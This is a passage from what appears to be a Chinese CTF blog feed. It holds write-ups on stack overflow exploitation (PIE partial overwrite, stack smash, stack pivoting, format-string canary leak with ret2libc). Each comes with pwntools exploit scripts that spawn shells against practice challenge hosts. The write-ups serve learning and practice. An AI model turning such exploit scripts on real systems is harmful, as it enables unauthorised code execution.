buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>rbp距离栈底0x100个字节，read读入0x10a个字节，仅存在0xa个字节的溢出，并且程序开启了pie保护，并且不好泄露程序或者栈的地址，程序存在明显的后门，考虑进行partal overwrite技术。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000001185                                   ; int back_door()<br>.text:0000000000001185                                   public back_door<br>.text:0000000000001185                                   back_door proc near<br>.text:0000000000001185                                   ; __unwind &#123;<br>.text:0000000000001185 000 55                            push    rbp<br>.text:0000000000001186 008 48 89 E5                      mov     rbp, rsp<br>.text:0000000000001189 008 58                            pop     rax<br>.text:000000000000118A 000 48 8D 3D 77 0E 00 00          lea     rdi, s                          ; &quot;You are born to pwn!&quot;<br>.text:0000000000001191 000 E8 9A FE FF FF                call    _puts<br>.text:0000000000001191<br>.text:0000000000001196 000 48 8D 3D 80 0E 00 00          lea     rdi, command                    ; &quot;/bin/sh&quot;<br>.text:000000000000119D 000 E8 9E FE FF FF                call    _system<br>.text:000000000000119D<br>.text:00000000000011A2 000 90                            nop<br>.text:00000000000011A3 000 5D                            pop     rbp<br>.text:00000000000011A4 -08 C3                            retn<br>.text:00000000000011A4                                   ; &#125; // starts at 1185<br>.text:00000000000011A4<br>.text:00000000000011A4                                   back_door endp ; sp-analysis failed<br></code></pre></td></tr></table></figure><p>因为开启了pie保护，导致后12位跟上面的都是一样的，但是程序的低位是不会发生变化的，我们记下后门函数的低位为0x185，所以我们可以仅修改末尾的4位（因为每个字符相当于占两位，无法只修改三位），这样有一定概率return到我们想要的后门地址，在这里我选择爆破后四位</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#a=process(&#x27;./easystack&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./easystack&#x27;</span>)<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    a=remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28014</span> )<br>    a.recvuntil(<span class="hljs-string">b&quot;What&#x27;s your name?\n&quot;</span>)<br>    num=num&lt;&lt;<span class="hljs-number">0xc</span><span class="hljs-comment">#zuo yi shi er wei yinwei yao baopo hou si wei</span><br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27;\x85\x01+num&#x27;</span><br>    a.send(payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;You are born to pwn!\n&quot;</span><span class="hljs-keyword">in</span> a.recv():<br>        a.interactive()<br>    a.close()<br>    <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BAstack%20smash%EF%BC%88%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4%EF%BC%89/"/>
    <url>/2024/09/16/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BAstack%20smash%EF%BC%88%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="花式栈溢出stack-smash（绕过canary保护）"><a href="#花式栈溢出stack-smash（绕过canary保护）" class="headerlink" title="花式栈溢出stack smash（绕过canary保护）"></a>花式栈溢出stack smash（绕过canary保护）</h2><p>原理：</p><p>就是绕过canary保护的技术，在程序加载canary保护之后，如果我们通过栈溢出在覆盖缓冲区的时候会连带着覆盖canary，然后程序就会报错，但是stack smash并不在乎报错，而是在于报错的内容，技巧就是利用打印这一信息的程序来获得我们想要的内容，这是因为程序在启动canary保护之后，如果发现canary被溢出修改就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况，该指针指向程序名：</p><p>bss段会被映射两次，bss段的另一个没有被改变的映射</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#a=process(&#x27;./smashes&#x27;)</span><br><span class="hljs-comment">#04:0020│     0x7fffffffde58 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2d8 ◂— &#x27;/home/lpp/test3/smashes&#x27; argv&#123;0&#125;的指针通常指向程序名称。</span><br><span class="hljs-comment">#基本思路，覆盖该指针直接指向shell</span><br>a=remote(<span class="hljs-string">&#x27;pwn.jarvisoj.com&#x27;</span>,<span class="hljs-number">9877</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x218</span>+p64(<span class="hljs-number">0x400d20</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-comment">#pause()</span><br>a.sendlineafter(<span class="hljs-string">&#x27;name?&#x27;</span>,payload)<br>a.sendlineafter(<span class="hljs-string">&#x27;flag:&#x27;</span>,<span class="hljs-string">b&#x27;lpppppppp&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is:&quot;</span>,a.recv())<br>a.interactive()<br></code></pre></td></tr></table></figure><p>具体执行</p><p>在gdb中使用命令“p&amp;__libc_argv[0]”就可以获得地址</p><p>找到argv指针的地址，找到输入函数的栈顶</p><p>看偏移，然后通过溢出来改变agrv指针的指向</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BAstack%20pivoting%EF%BC%88%E6%A0%88%E7%BF%BB%E8%BD%AC%EF%BC%89/"/>
    <url>/2024/09/16/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BAstack%20pivoting%EF%BC%88%E6%A0%88%E7%BF%BB%E8%BD%AC%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="花式栈溢出stack-pivoting（栈翻转）"><a href="#花式栈溢出stack-pivoting（栈翻转）" class="headerlink" title="花式栈溢出stack pivoting（栈翻转）"></a>花式栈溢出stack pivoting（栈翻转）</h2><p>原理：劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行rop，一般在以下情况适用：</p><p>1.可以控制的栈溢出的字节数比较少，难以构造较长的rop链</p><p>2.开启了pie保护，栈地址未知，我们可以将栈劫持到已知的区域。</p><p>3.其他漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写rop及进行漏洞利用</p><p>运用stack pivoting有以下几个要求</p><p>1.可以控制程序执行流</p><p>2.可以控制sp指针，一般来说，控制栈指针会使用rop，常见的控制栈指针的gadgets一般是pop rsp&#x2F;esp</p><p>当然，还会有一些其他的方法，比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面是正常的，下面是偏移的。</p><p>libc_csu_init:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:080485E8                               loc_80485E8:                            ; CODE XREF: __libc_csu_init+57↓j<br>.text:080485E8 8B 44 24 38                   mov     eax, [esp+2Ch+arg_8]<br>.text:080485EC 89 2C 24                      mov     [esp+2Ch+var_2C], ebp<br>.text:080485EF 89 44 24 08                   mov     [esp+2Ch+var_24], eax<br>.text:080485F3 8B 44 24 34                   mov     eax, [esp+2Ch+arg_4]<br>.text:080485F7 89 44 24 04                   mov     [esp+2Ch+var_28], eax<br>.text:080485FB FF 94 BB 08 FF FF FF          call    ds:(__frame_dummy_init_array_entry - 804A000h)[ebx+edi*4]<br>.text:080485FB<br>.text:08048602 83 C7 01                      add     edi, 1<br>.text:08048605 39 F7                         cmp     edi, esi<br>.text:08048607 75 DF                         jnz     short loc_80485E8<br>.text:08048607<br>.text:08048609<br>.text:08048609                               loc_8048609:                            ; CODE XREF: __libc_csu_init+30↑j<br>.text:08048609 83 C4 1C                      add     esp, 1Ch<br>.text:0804860C 5B                            pop     ebx<br>.text:0804860D 5E                            pop     esi<br>.text:0804860E 5F                            pop     edi<br>.text:0804860F 5D                            pop     ebp<br>.text:08048610 C3                            retn<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/"/>
    <url>/2024/09/16/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./test2&#x27;</span>)<br><br>system_addr=<span class="hljs-number">0x0804845C</span><br>bin_sh_addr=<span class="hljs-number">0x0804A024</span><br>system_plt_addr=<span class="hljs-number">0x08048320</span><br>payload=(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)*<span class="hljs-string">b&#x27;a&#x27;</span>+p32(system_addr)+p32(bin_sh_addr)<br><span class="hljs-comment">#payload1=(0x88+0x4)*&#x27;a&#x27;+p32(system_plt_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br><span class="hljs-comment">#error_payload=(0x88+0x4)*&#x27;a&#x27;+p32(system_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br>gdb.attach(p)<br><span class="hljs-comment">#print payload</span><br><span class="hljs-comment">#print payload1</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>调用函数plt地址，需要有返回地址一般加“bbbb”这类无效地址，后面加参数。</p><p>调用程序代码段的函数直接跟参数就行。</p><p>汇编语言中的call指令相当于：push call指令的下一条指令，jmp call指令单步步入的地址。</p><p>总而言之如果调用的是代码段里的函数后面直接跟该函数参数就可以，如果是调用的plt段的函数需要提供一个虚假返回地址后面再跟该函数的参数，上文的error_payload是将两者杂糅了，调用了代码段的函数并且提供了虚假的返回地址，导致system函数的参数是’bbbb’，而不是binsh_addr.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary%E5%9C%B0%E5%9D%80%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/"/>
    <url>/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary%E5%9C%B0%E5%9D%80%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串泄露canary地址（例题）"><a href="#格式化字符串泄露canary地址（例题）" class="headerlink" title="格式化字符串泄露canary地址（例题）"></a>格式化字符串泄露canary地址（例题）</h2><p>题目源码：</p><p>（格式化字符串漏洞所在函数）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">gift</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(byte_400A05);<br>  fflush(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>（栈溢出函数）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64</span>uLL);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于题目开启了canary保护</p><p>所以思路：通过格式化字符串泄露canary的值（以00结尾的地址）</p><p>使程序能正常结束，实现栈溢出，libc去getshell</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs applescript">lpp@lpp-virtual-machine:~/nss1$ ./babyrop2 <br>Can u <span class="hljs-literal">return</span> <span class="hljs-keyword">to</span> libc ?<br>Try u best!<br>I&#x27;ll give u <span class="hljs-keyword">some</span> gift <span class="hljs-keyword">to</span> help u!<br>aa%<span class="hljs-number">5</span>$p<br>aa0x25f92a0<br>Pull up your sword <span class="hljs-keyword">and</span> <span class="hljs-keyword">tell</span> <span class="hljs-keyword">me</span> u story!<br>^Z<br>[<span class="hljs-number">1</span>]+  已停止               ./babyrop2<br>lpp@lpp-virtual-machine:~/nss1$ ./babyrop2 <br>Can u <span class="hljs-literal">return</span> <span class="hljs-keyword">to</span> libc ?<br>Try u best!<br>I&#x27;ll give u <span class="hljs-keyword">some</span> gift <span class="hljs-keyword">to</span> help u!<br>AA%<span class="hljs-number">6</span>$p<br>AA0x702436254141<br>Pull up your sword <span class="hljs-keyword">and</span> <span class="hljs-keyword">tell</span> <span class="hljs-keyword">me</span> u story!<br>^Z<br>[<span class="hljs-number">2</span>]+  已停止               ./babyrop2<br>lpp@lpp-virtual-machine:~/nss1$ ./babyrop2 <br>Can u <span class="hljs-literal">return</span> <span class="hljs-keyword">to</span> libc ?<br>Try u best!<br>I&#x27;ll give u <span class="hljs-keyword">some</span> gift <span class="hljs-keyword">to</span> help u!<br>aa%<span class="hljs-number">7</span>$p<br>aa0xc3b2b14b13879500<br>Pull up your sword <span class="hljs-keyword">and</span> <span class="hljs-keyword">tell</span> <span class="hljs-keyword">me</span> u story!<br></code></pre></td></tr></table></figure><p>通过试验在输入aa%7$p的时候，会泄露出canary的值，也可以动调一下更加明显</p><p>栈情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00:0000│ rsp 0x7fffffffde98 —▸ 0x40085c (gift+72) ◂— mov edi, 0x400a05<br>01:0008│ rdi 0x7fffffffdea0 ◂— 0x702437256161 /* &#x27;aa%7$p&#x27; */<br>02:0010│-008 0x7fffffffdea8 ◂— 0xdaaf7fd3a946b400<br>03:0018│ rbp 0x7fffffffdeb0 —▸ 0x7fffffffded0 ◂— 0x1<br>04:0020│+008 0x7fffffffdeb8 —▸ 0x400905 (main+43) ◂— mov eax, 0<br>05:0028│+010 0x7fffffffdec0 ◂— 0x0<br>06:0030│+018 0x7fffffffdec8 ◂— 0xdaaf7fd3a946b400<br>07:0038│+020 0x7fffffffded0 ◂— 0x1<br></code></pre></td></tr></table></figure><p>能看到在rbp的上面有以00结尾的地址即为canary的值。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#a=remote(&#x27;node4.anna.nssctf.cn&#x27;,28719)</span><br>a=process(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br>rop=ROP(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br><br>padding=<span class="hljs-number">0x20</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(a.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>pop_rdi=<span class="hljs-number">0x0000000000400993</span><br>ret=<span class="hljs-number">0x00000000004005f9</span><br><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>vuln_addr=<span class="hljs-number">0x400887</span><br><br>payload1=<span class="hljs-string">b&quot;aa%7$p&quot;</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">b&quot;aa&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(a.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>payload2=<span class="hljs-string">b&quot;a&quot;</span>*(padding-<span class="hljs-number">0x08</span>)+p64(canary)+<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)<br>a.recvuntil(<span class="hljs-string">&#x27;story!\n&#x27;</span>)<br>a.sendline(payload2)<br><br>target_addr=u64(a.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(target_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,target_addr)<br>base_addr=target_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_addr=&quot;</span>+<span class="hljs-built_in">hex</span>(base_addr))<br>binsh=base_addr+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system_addr=base_addr+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br><br><span class="hljs-comment">#libc6_2.23-0ubuntu10_amd64</span><br>payload3=<span class="hljs-string">b&quot;a&quot;</span>*(padding-<span class="hljs-number">0x08</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system_addr)<br>a.sendline(payload3)<br>a.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6%EF%BC%88x86%EF%BC%89%E7%90%86%E8%AE%BA%E5%8F%AF%E8%A1%8C%E6%8A%A5%E6%AE%B5%E9%94%99%E8%AF%AF%E5%BE%85%E4%BF%AE%E6%AD%A3/"/>
    <url>/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6%EF%BC%88x86%EF%BC%89%E7%90%86%E8%AE%BA%E5%8F%AF%E8%A1%8C%E6%8A%A5%E6%AE%B5%E9%94%99%E8%AF%AF%E5%BE%85%E4%BF%AE%E6%AD%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串漏洞进阶（x86）"><a href="#格式化字符串漏洞进阶（x86）" class="headerlink" title="格式化字符串漏洞进阶（x86）"></a>格式化字符串漏洞进阶（x86）</h2><p>程序源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br><span class="hljs-type">int</span> a =<span class="hljs-number">1</span> ,b =<span class="hljs-number">0x22222222</span>, c=<span class="hljs-number">-1</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,s);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>,a,b,c,s);<br><span class="hljs-built_in">printf</span>(s);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译命令：gcc -m32 -fno-stack-protector -no -pie -o 1 1.c</p><p>通过gdb打开程序在printf处下断点，输入%08x.%08x.%08x</p><p>运行之后，程序停在printf处,此时栈空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00:0000│ esp 0xffffcfac —▸ 0x80491ea (main+100) ◂— add esp, 0x20<br>01:0004│-098 0xffffcfb0 —▸ 0x804a00b ◂— &#x27;%08x.%08x.%08x.%s\n&#x27;<br>02:0008│-094 0xffffcfb4 ◂— 0x1<br>03:000c│-090 0xffffcfb8 ◂— 0x22222222 (&#x27;&quot;&quot;&quot;&quot;&#x27;)<br>04:0010│-08c 0xffffcfbc ◂— 0xffffffff<br>05:0014│-088 0xffffcfc0 —▸ 0xffffcfd0 ◂— &#x27;%08x.%08x.%08x&#x27;<br>06:0018│-084 0xffffcfc4 —▸ 0xffffcfd0 ◂— &#x27;%08x.%08x.%08x&#x27;<br>07:001c│-080 0xffffcfc8 —▸ 0xf7fbe7b0 —▸ 0x80482c2 ◂— &#x27;GLIBC_2.34&#x27;<br></code></pre></td></tr></table></figure><p>0xffffcfac：printf返回地址</p><p>0xffffcfb0：格式化字符串，%08x.%08x.%08x.%s</p><p>格式化字符串的第一个%08x解析的是0x1，第二个%08x解析的是0x22222222，第三个%08x解析的是-1，第四个%s解析的是我们输入的“%08x.%08x.%08x”字符串</p><p>c继续运行，程序停在下一个printf：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00:0000│ esp 0xffffcfbc —▸ 0x80491f9 (main+115) ◂— add esp, 0x10<br>01:0004│-088 0xffffcfc0 —▸ 0xffffcfd0 ◂— &#x27;%08x.%08x.%08x&#x27;<br>02:0008│-084 0xffffcfc4 —▸ 0xffffcfd0 ◂— &#x27;%08x.%08x.%08x&#x27;<br>03:000c│-080 0xffffcfc8 —▸ 0xf7fbe7b0 —▸ 0x80482c2 ◂— &#x27;GLIBC_2.34&#x27;<br>04:0010│-07c 0xffffcfcc —▸ 0x804919d (main+23) ◂— add ebx, 0x2e63<br>05:0014│ eax 0xffffcfd0 ◂— &#x27;%08x.%08x.%08x&#x27;<br>06:0018│-074 0xffffcfd4 ◂— &#x27;.%08x.%08x&#x27;<br>07:001c│-070 0xffffcfd8 ◂— &#x27;x.%08x&#x27;<br></code></pre></td></tr></table></figure><p>由于第二次printf没有给参数，触发了格式化字符串漏洞，看到格式化字符串第一个%08x解析的是0xffffcfd0，第二个解析的是0xf7fbe7b0 ，第三个解析的是0x804919d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; c<br>Continuing.<br>ffffcfd0.f7fbe7b0.0804919d[Inferior 1 (process 4316) exited normally]<br></code></pre></td></tr></table></figure><p>和预测的一样</p><p>不只可以用%x%x%x还可以用%p来获取数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">lpp@lpp-virtual-machine:~/test$ ./0<br>%p.%p.%p 